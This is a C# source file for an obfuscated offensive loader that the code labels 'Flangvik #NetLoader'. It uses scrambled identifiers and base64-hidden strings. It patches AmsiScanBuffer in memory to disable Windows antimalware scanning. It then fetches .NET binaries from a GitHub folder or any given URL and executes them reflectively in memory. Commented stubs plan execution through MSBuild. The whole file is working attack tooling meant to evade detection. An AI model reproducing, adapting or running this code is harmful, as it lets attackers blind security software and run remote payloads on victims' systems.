using System;using System.Collections.Generic;using System.IO;using System.Net;using System.Text;using System.Reflection;//This if for MSBuild LOL bin stuff later//using Microsoft.Build.Framework;//using Microsoft.Build.Utilities;public class FillaCaryatidic{    private static WebClient FourrierSplaying = new WebClient() { };
	[System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "#965")]
    private static extern IntPtr AmgarnQuistron(string HypophoriaCommand);
	[System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "#1500")]
    private static extern IntPtr VeldskoenPantatype(IntPtr NoninfinitenessPetrolist, UIntPtr UnprinciplednessUnderzealous, uint FlaskfulHyperalgesis, out uint HemophagyPsia);
	[System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "#694")]
    private static extern IntPtr WolterTrap(IntPtr GrownTremulando, string MinerologistToft);
	private static void BiocatalyticCounterexercise(MethodInfo BlockishBushranging, object[] NongaseousGauziness = null)
    {
        //BlockishBushranging.Invoke(null, new object[] { new string[] { CanephoroeGravure } });
        BlockishBushranging.Invoke(null, NongaseousGauziness);
    }
	public static void Main(string[] args)
    {
        SecurityProtocolType SupplianceSheetings = (SecurityProtocolType)(3070 + 2);
        Console.WriteLine("[!] ~Flangvik  #NetLoader");
        AbirritatingSoaper();
        while (true)
        {
            try
            {
                ServicePointManager.SecurityProtocol = SupplianceSheetings;
                if (args.Length == 0)
                {
                    List<string> NesliaJokeless = MacersInequigranular();
                    Console.WriteLine("[+] Select a binary (number)>");
                    Console.WriteLine("------------------------");
                    Console.WriteLine("[0] - Exit NetLoader");
                    for (int BoothsPorthole = 0; BoothsPorthole < NesliaJokeless.Count; BoothsPorthole++)
                    {
                        Console.WriteLine("[" + (BoothsPorthole + 1) + "] - " + NesliaJokeless[BoothsPorthole]);
                        if (BoothsPorthole == NesliaJokeless.Count - 1)
                        {
                            Console.WriteLine("[" + (BoothsPorthole + 2) + "] - Custom PATH or URL ");
                        }
                    }
                    Console.WriteLine("-----------------------");
                    var AutocytolyticSucuri = Console.ReadLine();
                    if (Convert.ToInt32(AutocytolyticSucuri) == 0)
                    {
                        System.Environment.Exit(1);
                    }
                    else if (Convert.ToInt32(AutocytolyticSucuri) - 1 == NesliaJokeless.Count)
                    {
                        Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                        string AdducersDiathermaneity = Console.ReadLine();
                        Console.WriteLine("[+] Provide CanephoroeGravure for {0} >", AdducersDiathermaneity);
                        string AshakeBrowsed = Console.ReadLine();
                        EcologyRepressory("", AshakeBrowsed, AdducersDiathermaneity, false);
                    }
                    else if (Convert.ToInt32(AutocytolyticSucuri) - 1 > NesliaJokeless.Count | Convert.ToInt32(AutocytolyticSucuri) - 1 < 0)
                    {
                        Console.WriteLine("[!] Bad Input, sry!");
                    }
                    else
                    {
                        Console.WriteLine("[+] Provide CanephoroeGravure for {0} >", NesliaJokeless[Convert.ToInt32(AutocytolyticSucuri) - 1]);
                        string AshakeBrowsed = Console.ReadLine();
                        EcologyRepressory(NesliaJokeless[Convert.ToInt32(AutocytolyticSucuri) - 1], AshakeBrowsed);
                    }
                }
                else
                {
                    string TzarevnaSuccussive = "";
                    string UneuphemisticPhaneromere = "";
                    bool SignificalImmethodically = false;
                    foreach (var argument in args)
                    {
                        if (argument.ToLower().Contains("path"))
                        {
                            var MicromesenteryLiparidae = Array.IndexOf(args, argument) + 1;
                            if (MicromesenteryLiparidae < args.Length)
                            {
                                var IndwellSurveyed = args[Array.IndexOf(args, argument) + 1];
                                if (SignificalImmethodically)
                                    TzarevnaSuccussive = Encoding.UTF8.GetString(Convert.FromBase64String(IndwellSurveyed));
                                else
                                    TzarevnaSuccussive = IndwellSurveyed;
                            }
                        }
                        if (argument.ToLower().Contains("b64"))
                            SignificalImmethodically = true;
                        if (argument.ToLower().Contains("args"))
                        {
                            var MicromesenteryLiparidae = Array.IndexOf(args, argument) + 1;
                            if (MicromesenteryLiparidae < args.Length)
                            {
                                var IndwellSurveyedArgs = args[Array.IndexOf(args, argument) + 1];
                                if (SignificalImmethodically)
                                    UneuphemisticPhaneromere = Encoding.UTF8.GetString(Convert.FromBase64String(IndwellSurveyedArgs));
                                else
                                    UneuphemisticPhaneromere = IndwellSurveyedArgs;
                            }
                        }
                    }
                    if (args.Length == 1 && string.IsNullOrEmpty(UneuphemisticPhaneromere) && string.IsNullOrEmpty(TzarevnaSuccussive) && !SignificalImmethodically)
                    {
                        TzarevnaSuccussive = args[0];
                    }
                    if (args.Length == 2 && string.IsNullOrEmpty(UneuphemisticPhaneromere) && string.IsNullOrEmpty(TzarevnaSuccussive) && !SignificalImmethodically)
                    {
                        UneuphemisticPhaneromere = args[1];
                        TzarevnaSuccussive = args[0];
                    }
                    if (args.Length == 3 && string.IsNullOrEmpty(UneuphemisticPhaneromere) && string.IsNullOrEmpty(TzarevnaSuccussive) && SignificalImmethodically)
                    {
                        TzarevnaSuccussive = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                        UneuphemisticPhaneromere = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
                    }
                    if (args.Length == 2 && SignificalImmethodically)
                    {
                        if (!string.IsNullOrEmpty(args[1]))
                            TzarevnaSuccussive = Encoding.UTF8.GetString(Convert.FromBase64String(args[1]));
                    }
                    if (!string.IsNullOrEmpty(TzarevnaSuccussive))
                    {
                        Console.WriteLine("[+] {0} args -> {1}", TzarevnaSuccussive, UneuphemisticPhaneromere);
                        EcologyRepressory("", UneuphemisticPhaneromere, TzarevnaSuccussive, false);
                        Environment.Exit(0);
                    }
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed");
                Console.WriteLine("[!] {0}", ex.Message);
                Environment.Exit(0);
            }
        }
    }
	private static MethodInfo ButterflyerPiacularity(Assembly FalchionsSaccharorrhea)
    {
        return FalchionsSaccharorrhea.EntryPoint;
    }
	public static Assembly TartufesEssentialism(byte[] FestermentBroths)
    {
        return Assembly.Load(FestermentBroths);
    }
	private static List<string> MacersInequigranular()
    {
        var NoblessesElevates = new List<string>() { };
        System.Text.RegularExpressions.Regex OnomatopoesyOrdinariest = new System.Text.RegularExpressions.Regex(@"\/[A-Za-z]{0,50}\.bin", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
        foreach (var match in OnomatopoesyOrdinariest.Matches(FourrierSplaying.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")))))
        {
            NoblessesElevates.Add(match.ToString().TrimStart('/'));
        }
        return NoblessesElevates;
    }
	public static void EcologyRepressory(string PresubordinatedHutched, string CanephoroeGravure = "", string EnsueDesegmentation = "", bool SunnClarifiers = true)
    {
        if (!SunnClarifiers)
        {
            BiocatalyticCounterexercise(ButterflyerPiacularity(TartufesEssentialism(AdenocarcinomasLums(EnsueDesegmentation))), new object[] { new string[] { CanephoroeGravure } });
        }
        else
        {
            PresubordinatedHutched = "/" + PresubordinatedHutched + Encoding.UTF8.GetString(Convert.FromBase64String("P3Jhdz10cnVl"));
            string PersuasoryDovened = "";
            BiocatalyticCounterexercise(ButterflyerPiacularity(TartufesEssentialism(AdenocarcinomasLums(
                (Encoding.UTF8.GetString(Convert.FromBase64String(("aHR0cHM6Ly9naXRod_IuY29tL0ZsY_5ndmlrL05ldExvY_Rlci90cmVlL21hc3Rlci9Ca_5hcmllcw==").Replace("_", "W"))) + PresubordinatedHutched).Replace("tree", "blob")))), new object[] { new string[] { CanephoroeGravure } });
        }
    }
	public static byte[] AdenocarcinomasLums(string UnmistakablenessPocketful)
    {
        if (UnmistakablenessPocketful.StartsWith("http"))
            return FourrierSplaying.DownloadData(UnmistakablenessPocketful);
        return File.ReadAllBytes(UnmistakablenessPocketful);
    }
	private static void AbirritatingSoaper(bool PolycraticMacroinstruction = false)
    {
        Console.WriteLine("[+] Doing the thing");
        IntPtr SpiringConqueress = WolterTrap(AmgarnQuistron(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw="))), Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
        uint AntiliftDragooning = 0x40;
        uint CliverMustaches = 0;
        var MydaidaeJeeringly = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        if (System.Environment.Is64BitOperatingSystem)
            MydaidaeJeeringly = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        var CapeworkErythrocytic = VeldskoenPantatype(SpiringConqueress, (UIntPtr)MydaidaeJeeringly.Length, AntiliftDragooning, out CliverMustaches);
        if (CapeworkErythrocytic != null)
            System.Runtime.InteropServices.Marshal.Copy(MydaidaeJeeringly, 5 - 5, SpiringConqueress, MydaidaeJeeringly.Length);
    }
	/*
	 //This is for MSBuild later
	public class ClassExample : Task, ITask
	{
	    public override bool Execute()
	    {
	        FillaCaryatidic.Main(new string[] { });
	        return true;
	    }
	}
	*/
}